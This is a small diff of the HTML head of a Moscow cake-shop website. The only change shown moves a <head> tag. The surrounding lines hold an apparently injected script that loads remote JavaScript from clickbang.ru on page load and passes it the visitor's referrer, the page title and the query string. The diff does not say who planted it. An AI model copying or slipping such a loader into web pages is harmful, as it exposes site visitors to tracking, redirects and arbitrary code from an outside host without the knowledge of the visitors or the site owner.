@@ -4,6 +4,9 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
+
+
+<head>
 <span id="2e761592-74c5-3e66-bc55-886eb96c6078"></span><script type="application/javascript">
 var d=document;var s=d.createElement('script'); 
 s.src='//clickbang.ru/XWgRHP?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5e5615051971e=script5e56150519720&_cid=2e761592-74c5-3e66-bc55-886eb96c6078'; 
@@ -14,9 +17,6 @@ d.getElementsByTagName('head')[0].appendChild(s);
 }
 if (document.location.protocol === 'https:' && '//clickbang.ru/XWgRHP?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5e5615051971e=script5e56150519720'.indexOf('http:') === 0 ) {alert('The website works on HTTPS. The tracker must use HTTPS too.');}
 </script>
-
-<head>
-
 <title>Торты на заказ в Москве - кондитерская для вас</title>
 
 
